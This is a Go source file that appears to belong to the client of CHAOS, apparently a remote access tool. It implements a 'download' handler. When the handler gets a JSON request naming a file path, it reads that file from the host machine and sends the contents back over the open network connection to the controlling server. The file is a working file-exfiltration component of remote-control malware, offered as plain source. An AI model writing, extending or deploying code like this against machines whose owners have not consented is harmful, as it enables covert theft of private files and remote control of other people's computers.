package download

import (
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type DownloadUseCase struct {
	Connection net.Conn
}

func NewDownloadUseCase(conn net.Conn) usecase.Download {
	return &DownloadUseCase{
		Connection: conn,
	}
}

func (d DownloadUseCase) File(data []byte) {
	var errData models.Error
	var download models.Download
	if err := json.Unmarshal(data, &download); err != nil {
		log.WithField("cause", err.Error()).Error("error decoding download")
		errData.HasError = true
		errData.Message = err.Error()
	}

	file, err := util.ReadFile(download.Filepath)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading file")
		errData.HasError = true
		errData.Message = err.Error()
	}

	if err = network.Send(d.Connection, models.Message{
		Command: "download",
		Data:    file,
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending file")
	}
}
